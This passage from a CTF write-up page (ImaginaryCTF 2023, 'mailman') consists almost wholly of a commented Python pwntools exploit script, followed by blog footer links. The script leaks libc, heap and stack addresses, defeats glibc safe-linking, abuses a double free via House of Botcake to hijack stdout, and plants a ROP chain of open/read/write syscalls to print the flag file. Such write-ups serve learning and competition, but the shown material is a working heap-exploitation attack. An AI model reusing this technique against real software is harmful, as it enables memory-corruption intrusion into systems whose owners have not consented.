</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">conn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">if</span> args<span class="token punctuation">.</span>LOCAL<span class="token punctuation">:</span>
</span><span class="code-line">        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line">        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;mailman.chal.imaginaryctf.org&quot;</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">return</span> r
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Safelinking deobfuscation helper</span>
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">deobfuscate</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    mask <span class="token operator">=</span> <span class="token number">0xfff</span> <span class="token operator">&lt;&lt;</span> <span class="token number">52</span>
</span><span class="code-line">    <span class="token keyword">while</span> mask<span class="token punctuation">:</span>
</span><span class="code-line">        v <span class="token operator">=</span> val <span class="token operator">&amp;</span> mask
</span><span class="code-line">        val <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>v <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span>
</span><span class="code-line">        mask <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">12</span>
</span><span class="code-line">    <span class="token keyword">return</span> val
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">global</span> heap
</span><span class="code-line">    r <span class="token operator">=</span> conn<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ALLOCATING: &quot;</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;idx: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;size: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;content: &quot;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;FREEING: &quot;</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;idx: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;SHOWING: &quot;</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;3&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">        r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;idx: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">return</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># Make two large chunks</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1350</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1350</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># Free the first one so bk = main_arena in libc</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">    resp <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># parse the libc address in little-endian</span>
</span><span class="code-line">    libcaddr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>resp<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># Use offsets found in gdb to compute libc base</span>
</span><span class="code-line">    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libcaddr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f7c10419ce0</span> <span class="token operator">-</span> <span class="token number">0x7f7c10200000</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Libc Leak: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment">#Grab some blocks</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span> <span class="token comment">#excess</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span> <span class="token comment">#excess</span>
</span><span class="code-line">    <span class="token comment"># Place them into the tcache</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
</span><span class="code-line">    show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment">#This printed out a heap address</span>
</span><span class="code-line">    addr <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment">#Parse, deobfuscate, and set heap base.</span>
</span><span class="code-line">    addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
</span><span class="code-line">    heap_leak <span class="token operator">=</span> deobfuscate<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># seccomp actually alloc&#x27;d over a page of memory,</span>
</span><span class="code-line">    <span class="token comment"># so base was -0x1000 from what I got.</span>
</span><span class="code-line">    heap <span class="token operator">=</span> <span class="token punctuation">(</span>heap_leak <span class="token operator">&gt;&gt;</span> <span class="token number">12</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1000</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Heap Base: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Cleaning tcaches + smallbins&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># Get environ and stdout</span>
</span><span class="code-line">    environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&#x27;environ&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">    stdout <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&#x27;_IO_2_1_stdout_&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># House of botcake</span>
</span><span class="code-line">    <span class="token comment"># Allocate 7 blocks of size 0x200, we’ll free them later</span>
</span><span class="code-line">    <span class="token comment"># We can’t leak them as before, so place them into our mem array properly</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        alloc<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># Allocate our prev block and our victim block, along with the buffer</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;prev&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;victim&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;flag.txt\x00&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># Fill the tcache!</span>
</span><span class="code-line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        free<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">+</span>i<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># free our victim chunk</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># free our previous chunk (they are now consolidated)</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;X&#x27;</span><span class="token punctuation">)</span>  <span class="token comment"># Open up a slot in the tcache</span>
</span><span class="code-line">    <span class="token comment"># double free vulnerablity, now victim is in the tcache!</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk</span>
</span><span class="code-line">    <span class="token comment"># We’re going to write to it the necessary padding then:</span>
</span><span class="code-line">    <span class="token comment"># 0x211, to preserve the size of the victim chunk</span>
</span><span class="code-line">    <span class="token comment"># stdout ^ ((heap + 0x3320) &gt;&gt; 12), because we need to pass a safe-linked ptr.</span>
</span><span class="code-line">    <span class="token comment"># Otherwise, malloc will crash. 0x3320 offset was found via debugging.</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x230</span><span class="token punctuation">,</span> <span class="token string">b&#x27;T&#x27;</span><span class="token operator">*</span><span class="token number">0x208</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x211</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>stdout <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x3320</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;X&#x27;</span><span class="token punctuation">)</span> <span class="token comment"># remove victim from the tcache again, updating the linked list structure</span>
</span><span class="code-line">    <span class="token comment"># This alloc writes to stdout. It sets stdout’s write buffer to be environ, and sets flags to cause it to flush on next print</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># When printf(&quot;&gt; &quot;) happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.</span>
</span><span class="code-line">    stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x258</span> <span class="token comment"># offset computed in gdb</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Stack Leak: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># Setup our ROP chain through libc.</span>
</span><span class="code-line">    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># Use that buffer block as a flag buffer (offsets found through gdb)</span>
</span><span class="code-line">    flagoffset <span class="token operator">=</span> <span class="token number">0x55d31ac5f520</span> <span class="token operator">-</span> <span class="token number">0x55d31ac5c000</span>
</span><span class="code-line">    flag <span class="token operator">=</span> heap <span class="token operator">+</span> flagoffset<span class="token operator">+</span><span class="token number">16</span>
</span><span class="code-line">    <span class="token comment"># Just make the area after the flag chunk our buffer, its probably writable.</span>
</span><span class="code-line">    output <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">0x20</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Flag.txt: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># Use rop call to automatically generate function calls</span>
</span><span class="code-line">    rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&#x27;syscall&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> flag<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">    rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&#x27;syscall&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">    rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&#x27;syscall&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># free our forged chunk</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># free our victim chunk</span>
</span><span class="code-line">    <span class="token comment"># write to our forged chunk (which again contains the metadata to victim)</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x230</span><span class="token punctuation">,</span> <span class="token string">b&#x27;T&#x27;</span><span class="token operator">*</span><span class="token number">0x208</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x211</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x3320</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># alloc our victim chunk again.</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;xxx&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># allocs to somewhere on stack before _IO_file_underflow to hijack the return address of it.</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b&#x27;A&#x27;</span><span class="token operator">*</span><span class="token number">0xc8</span><span class="token operator">+</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
</span><span class="code-line">    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Fimaginary-ctf-2023%2Fmailman">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/imaginary-ctf-2023/mailman.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Originally published on</h2><div class="flex flex-wrap text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a target="_blank" rel="noopener noreferrer" href="https://surg.dev/ictf23/">surg.dev</a></div></div><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/imaginary-ctf-2023/">Imaginary-CTF-2023</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/assembly/">Assembly</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/x86_64/">x86_64</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/reverse-engineering/">Reverse-Engineering</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/binary-exploitation/">Binary-Exploitation</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn/">Pwn</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/crew-ctf-2023/web3/">CrewCTF 2023</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/intigriti-0823/writeup/">Intigriti 0823 – August XSS Challenge</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 